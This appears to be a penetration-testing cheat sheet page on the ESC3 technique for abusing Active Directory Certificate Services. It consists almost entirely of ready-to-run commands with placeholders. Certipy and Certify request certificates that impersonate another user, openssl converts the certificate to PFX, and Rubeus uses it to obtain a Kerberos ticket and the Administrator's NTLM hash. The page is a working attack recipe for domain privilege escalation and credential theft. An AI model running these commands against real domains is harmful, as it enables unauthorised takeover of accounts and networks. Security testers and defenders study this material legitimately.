# ESC3

{% tabs %}
{% tab title="Linux" %}
Request the certificate

{% code overflow="wrap" %}
```bash
certipy-ad req -username <User>@<Ip> -password <Pass> -ca <CA-Name> -target <Target> -template <Template> -upn <Target User>@<Ip> -dns <target FQDN> -debug
```
{% endcode %}


{% endtab %}

{% tab title="Windows" %}
{% code overflow="wrap" %}
```powershell
Certify.exe request /ca:<Target dc>\<CA-Name> /template:<Vulnerable Template> /altname:<Target Template>
```
{% endcode %}

Convert the key and certificate to PFX12 format

{% code overflow="wrap" %}
```powershell
openssl.exe pkcs12 -in cert.pem -inkey private.key -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```
{% endcode %}

Upload Rubeus and the cert.pfx onto the machine and retrieve the NTLM hash

{% code overflow="wrap" %}
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/Pasted image 20230719143559.png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}
